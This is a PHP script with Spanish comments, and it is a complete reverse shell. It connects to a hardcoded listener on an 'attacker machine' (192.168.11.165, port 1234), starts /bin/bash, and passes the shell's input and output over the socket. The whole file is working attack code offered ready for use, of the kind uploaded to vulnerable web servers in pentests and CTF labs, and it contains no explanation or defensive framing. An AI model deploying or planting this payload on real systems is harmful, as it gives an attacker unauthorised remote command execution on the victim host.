<?php
// IP y puerto de tu máquina atacante (escuchando con netcat o similar)
$ip = '192.168.11.165';
$port = 1234;

// Crear socket y conectarse a la máquina atacante
$sock = fsockopen($ip, $port);
if (!$sock) {
    die("No se pudo conectar");
}

// Ejecutar bash y redirigir entrada/salida/error al socket
$proc = proc_open('/bin/bash', [
    0 => ['pipe', 'r'],  // stdin
    1 => ['pipe', 'w'],  // stdout
    2 => ['pipe', 'w']   // stderr
], $pipes);

if (is_resource($proc)) {
    stream_set_blocking($pipes[0], false);
    stream_set_blocking($pipes[1], false);
    stream_set_blocking($pipes[2], false);
    stream_set_blocking($sock, false);

    while (1) {
        // Leer desde socket y enviar a bash
        if (feof($sock)) break;
        $read = [$sock, $pipes[1], $pipes[2]];
        $write = null;
        $except = null;
        if (stream_select($read, $write, $except, null) > 0) {
            if (in_array($sock, $read)) {
                $input = fread($sock, 1024);
                fwrite($pipes[0], $input);
            }
            if (in_array($pipes[1], $read)) {
                $output = fread($pipes[1], 1024);
                fwrite($sock, $output);
            }
            if (in_array($pipes[2], $read)) {
                $error = fread($pipes[2], 1024);
                fwrite($sock, $error);
            }
        }
    }
    fclose($sock);
    foreach ($pipes as $pipe) {
        fclose($pipe);
    }
    proc_close($proc);
}
?>
